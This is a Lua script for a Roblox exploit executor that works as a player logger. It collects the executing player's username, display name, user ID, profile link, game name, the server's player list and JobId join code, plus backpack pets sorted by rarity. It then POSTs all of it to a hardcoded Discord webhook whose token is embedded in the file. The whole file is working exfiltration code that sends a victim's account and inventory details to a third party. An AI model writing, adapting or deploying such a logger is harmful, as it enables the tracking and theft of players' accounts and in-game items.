local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
local gameName = "Unknown"

-- 寵物品質分類表
local GAGQuality = { 
    Common = { 
        "Starfish", "Crab", "Seagull", "Bunny", "Dog", "Golden Lab" 
    }, 
    Uncommon = { 
        "Bee", "Shiba Inu", "Black Bunny", "Cat", "Chicken", "Deer" 
    }, 
    Rare = { 
        "Flamingo", "Toucan", "Sea Turtle", "Orangutan", "Seal", "Honey Bee", "Wasp", 
        "Nihonzaru", "Kiwi", "Hedgehog", "Monkey", "Orange Tabby", "Pig", "Rooster", "Spotted Deer" 
    }, 
    Legendary = { 
        "Grey Mouse", "Tarantula Hawk", "Caterpillar", "Snail", "Petal Bee", "Moth", 
        "Scarlet Macaw", "Ostrich", "Peacock", "Capybara", "Tanuki", "Tanchozuru", 
        "Cow", "Polar Bear", "Sea Otter", "Silver Monkey", "Panda", "Blood Hedgehog", 
        "Frog", "Mole", "Moon Cat", "Bald Eagle", "Turtle", "Sand Snake", "Meerkat", 
        "Parasaurolophus", "Iguanodon", "Pachycephalosaurus", "Raptor", "Triceratops", "Stegosaurus" 
    }, 
    Mythical = { 
        "Brown Mouse", "Giant Ant", "Praying Mantis", "Red Giant Ant", "Squirrel", 
        "Bear Bee", "Butterfly", "Pack Bee", "Mimic Octopus", "Kappa", "Hamster", 
        "Chicken Zombie", "Firefly", "Owl", "Golden Bee", "Echo Frog", "Cooked Owl", 
        "Blood Kiwi", "Night Owl", "Hyacinth Macaw", "Axolotl", "Dilophosaurus", 
        "Ankylosaurus", "Pterodactyl", "Brontosaurus", "Koi" 
    }, 
    Divine = { 
        "Red Fox", "Dragonfly", "Disco Bee", "Blood Owl", "Raccoon", "Fennec Fox", 
        "Spinosaurus", "T-Rex", "Queen Bee" 
    }, 
    Prismatic = { 
        "Kitsune" 
    },
    Unknown = {
        "Red Dragon", "Raiju"
    }
}

-- 嘗試取得遊戲名稱
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    gameName = info.Name or "Unknown"
end)

-- 取得伺服器玩家清單
local playerList = ""
local playerCount = 0
for _, player in ipairs(Players:GetPlayers()) do
    playerList = playerList .. "- " .. player.Name .. "\n"
    playerCount = playerCount + 1
end

-- Roblox 玩家個人頁面網址
local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId) .. "/profile"

-- 準備分類裝寵物的容器
local ownedPetsByQuality = {}
for quality,_ in pairs(GAGQuality) do
    ownedPetsByQuality[quality] = {}
end

-- 讀取玩家背包
local backpack = LocalPlayer:FindFirstChild("Backpack")
if backpack then
    for _, item in ipairs(backpack:GetChildren()) do
        local itemName = item.Name
        -- 搜尋該寵物名稱屬於哪個品質
        local foundQuality = nil
        for quality, petList in pairs(GAGQuality) do
            for _, petName in ipairs(petList) do
                if petName == itemName then
                    foundQuality = quality
                    break
                end
            end
            if foundQuality then break end
        end
        -- 分類記錄
        if foundQuality then
            table.insert(ownedPetsByQuality[foundQuality], itemName)
        end
    end
end

-- 整理成文字，每個品質一行
local petsDisplay = ""
for quality, pets in pairs(ownedPetsByQuality) do
    if #pets > 0 then
        petsDisplay = petsDisplay .. "**" .. quality .. ":** " .. table.concat(pets, ", ") .. "\n"
    end
end
if petsDisplay == "" then
    petsDisplay = "無寵物"
elseif #petsDisplay > 1024 then
    petsDisplay = petsDisplay:sub(1, 1021) .. "..."
end

-- Embed組裝
local embed = {
    ["title"] = "Script Executed",
    ["description"] = "**真實名稱:** " .. LocalPlayer.Name ..
                      "\n**顯示名稱:** " .. LocalPlayer.DisplayName ..
                      "\n**玩家ID:** " .. LocalPlayer.UserId ..
                      "\n**個人資料:** [Roblox 個人頁面](" .. profileUrl .. ")" ..
                      "\n**遊戲:** " .. gameName ..
                      "\n**玩家伺服器人數:** " .. playerCount ..
                      "\n**加入代碼:** " .. game.JobId,
    ["fields"] = {
        {
            ["name"] = "玩家清單",
            ["value"] = playerList:sub(1, 1024),
            ["inline"] = false
        },
        {
            ["name"] = "玩家背包寵物 (依品質分類)",
            ["value"] = petsDisplay,
            ["inline"] = false
        }
    },
    ["color"] = tonumber("0x3498db"),
    ["footer"] = {
        ["text"] = "Logger"
    },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local data = {
    ["username"] = "Script Logger",
    ["embeds"] = {embed}
}

-- 發送Discord webhook
pcall(function()
    local jsonData = HttpService:JSONEncode(data)
    local requestFunc = request or http_request or syn and syn.request or http and http.request
    if requestFunc then
        requestFunc({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    else
        warn("你的執行器不支援 HTTP Request")
    end
end)
